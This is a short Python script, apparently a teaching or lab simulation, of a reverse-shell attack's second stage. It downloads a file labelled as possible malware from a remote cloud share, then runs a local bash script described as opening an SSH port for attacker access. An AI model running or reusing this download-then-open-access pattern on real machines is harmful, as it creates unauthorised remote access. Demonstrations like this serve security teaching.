import requests
import subprocess

def reverse_shell_target():
    """
    Downloads a file from a remote server and, if successful,
    triggers the execution of a script that temporarily opens
    an SSH port on the local machine.

    This simulates the second stage of a reverse-shell attack:
    - Downloading a malicious payload
    - Executing a helper script to enable attacker access
    """
    # URL of the file (payload) to download
    url =  "https://tubcloud.tu-berlin.de/s/FNmHMXp3zWiMggb/download/ThatCouldBeMaleware.png"

    # Filename under which the file will be stored locally
    filename = "ThatCouldBeMaleware.png"

    # Attempt to download the file
    response = requests.get(url)

    if response.status_code == 200:
         # Save the downloaded file to disk
        with open(filename, "wb") as f:
            f.write(response.content)
         # After successful download, execute a script to open an SSH port
        open_temp_ssh()
    else:
        # Failed download attempt
        print("Download failed! {response.status_code}")

def open_temp_ssh():
    """
    Executes a shell script that enables temporary SSH access.
    This script must exist in the same directory and typically modifies
    firewall or sshd settings to allow inbound connections.

    Raises an error if execution fails.
    """
    # Path to the helper script
    path = "./open_ssh_temp.sh"

    try:
         # Execute the script as a Bash command
        subprocess.run(["bash", path], check = True )
    except subprocess.CalledProcessError:
         # Execute the script as a Bash command
        print(f"SSH port can not open!")


